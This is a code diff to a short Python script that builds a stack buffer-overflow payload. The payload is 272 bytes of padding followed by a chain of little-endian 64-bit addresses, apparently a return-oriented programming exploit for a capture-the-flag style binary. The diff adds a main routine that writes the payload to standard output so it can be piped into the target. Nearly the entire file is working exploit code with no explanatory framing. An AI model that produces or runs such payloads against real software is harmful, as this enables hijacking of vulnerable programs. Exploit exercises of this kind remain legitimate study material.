@@ -1,5 +1,5 @@
-# gets something like: 00000000004015e9
-# returns the little-endian byte string of a 16-char hex word
+import sys
+
 def le64(word_hex):
     """Return the little-endian byte string of a 16-char hex word."""
     return bytes.fromhex(word_hex)[::-1]
@@ -18,6 +18,11 @@ words = [
 def get_id(addr1, addr2):
     return b"0A" + (b"A" * (272 - 2)) + le64(words[0]) + le64(words[1]) + le64(words[2]) + le64(words[3]) + le64(words[4]) + le64(words[5]) + b"\n"
 
-
-def get_password(addr1, addr2):
-    return "\n"
+if __name__ == "__main__":
+    try:
+        byte_data = get_id(0, 0)
+        byte_data += b"\n"
+        sys.stdout.buffer.write(byte_data)
+    except Exception as e:
+        print(f"Error: {e}", file=sys.stderr)
+        sys.exit(1)
